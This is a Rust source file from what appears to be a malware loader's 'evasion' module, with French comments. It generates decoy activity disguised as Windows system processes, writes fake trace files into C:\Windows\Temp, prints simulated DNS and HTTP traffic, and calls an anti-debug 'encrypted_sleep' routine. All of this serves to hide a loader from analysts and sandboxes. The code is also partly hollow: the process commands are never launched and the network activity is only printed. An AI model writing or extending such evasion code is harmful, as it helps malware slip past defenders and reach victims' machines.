// loader/src/evasion/fake_processes.rs

use std::process::{Command, Stdio};
use rand::Rng;

use crate::evasion::anti_debug::encrypted_sleep;
    
pub fn spawn_decoy_processes_evasive() {
    use rand::Rng;
    
    let mut rng = rand::thread_rng();
    let count = rng.gen_range(2..=5);
    
    for _ in 0..count {
        // Choisir un processus à simuler
        let processes = [
            ("cmd", "Windows Update Check"),
            ("powershell", "Get-Date"),
            ("wmic", "os get caption"),
            ("tasklist", ""),
            ("ipconfig", "/all"),
        ];
        
        let (proc, desc) = processes[rng.gen_range(0..processes.len())];
        
        // Simuler le lancement
        simulate_process_activity(proc, desc);
        
        encrypted_sleep(rng.gen_range(50..300));
    }
}

fn simulate_process_activity(proc_name: &str, description: &str) {
    // 1. Créer une empreinte mémoire factice
    let mut memory_footprint = vec![0u8; 1024];
    for (i, byte) in memory_footprint.iter_mut().enumerate() {
        *byte = (i % 256) as u8;
    }
    
    // 2. Simuler des appels système
    for _ in 0..10 {
        let mut dummy: u64 = 0;
        for j in 0..100 {
            dummy = dummy.wrapping_add(j as u64);
            dummy = dummy.rotate_left((j % 64) as u32);
        }
        
        // Petit délai pour simuler l'exécution
        crate::evasion::anti_debug::encrypted_sleep(5);
    }
    
    // 3. Créer un fichier trace factice
    let trace_content = format!(
        "[{}] {} - PID: {}, Time: {}",
        chrono::Local::now().format("%H:%M:%S"),
        description,
        rand::thread_rng().gen_range(1000..20000),
        rand::thread_rng().gen_range(1..100)
    );
    
    let _ = std::fs::write(
        format!("C:\\Windows\\Temp\\trace_{}.tmp", 
            rand::thread_rng().gen::<u32>()
        ),
        trace_content
    );
}
    
    
/// Simuler une activité réseau légitime
pub fn simulate_network_activity() {
    
    // 1. Simuler des résolutions DNS
    for domain in &["microsoft.com", "google.com", "github.com"] {
        println!("  - Résolution DNS: {}", domain);
        encrypted_sleep(50);
    }
    
    // 2. Simuler des requêtes HTTP
    println!("  - Requête HTTP GET /");
    encrypted_sleep(100);
    
    // 3. Simuler des paquets réseau
    println!("  - Échange de paquets TCP");
    encrypted_sleep(150);
}